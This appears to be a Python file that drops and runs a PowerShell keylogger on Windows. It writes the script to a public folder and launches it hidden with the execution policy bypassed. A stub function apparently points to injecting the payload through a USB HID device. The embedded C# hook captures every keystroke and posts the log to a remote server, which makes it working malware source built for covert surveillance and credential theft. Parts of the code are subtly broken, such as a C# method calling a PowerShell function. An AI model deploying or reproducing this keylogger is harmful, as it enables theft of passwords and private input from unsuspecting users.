import time
import hid
import os

# Define the PowerShell script to be created and executed
powershell_script = """
$serverUrl = "http://<your-server-url>/keylog"  # Replace with your actual server URL

function Send-KeyLog {
    param (
        [string]$keylog
    )
    
    $headers = @{ "Content-Type" = "application/json" }
    $body = @{ "keystrokes" = $keylog } | ConvertTo-Json
    Invoke-WebRequest -Uri $serverUrl -Method POST -Headers $headers -Body $body
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class Keylogger {
    // Define the required constants and structures for the keyboard hook
    const int WH_KEYBOARD_LL = 13;
    const int WM_KEYDOWN = 0x0100;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public IntPtr dwExtraInfo;
    }

    // Declare the hook type
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string keylog = "";

    public static void Start() {
        _hookID = SetHook(_proc);
        Application.Run();  // Keep the application running to listen for key presses
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            var vkCode = Marshal.ReadInt32(lParam);
            char key = (char)vkCode;
            keylog += key;  // Append the captured key to the log

            Send-KeyLog(keylog);  // Send the keystrokes to the server
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hmod, uint dwThreadId);

    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

[Keylogger]::Start()

"""

# Function to send keystrokes to simulate typing the PowerShell script
def send_key(key):
    # Implement HID functionality to send key presses to the target machine
    # Code to simulate keyboard input and type `powershell_script` (use HID library)
    pass

# Define a function to save the PowerShell script on the target machine
def create_powershell_script():
    # The file path where the script will be saved
    file_path = "C:\\Users\\Public\\keylogger.ps1"

    # Save the PowerShell script to a file on the target machine
    with open(file_path, "w") as f:
        f.write(powershell_script)

    # Use PowerShell to execute the script silently (without Run dialog)
    # Start PowerShell in a hidden process and run the script
    os.system('powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\keylogger.ps1')

# Run the function to create and run the keylogger
create_powershell_script()
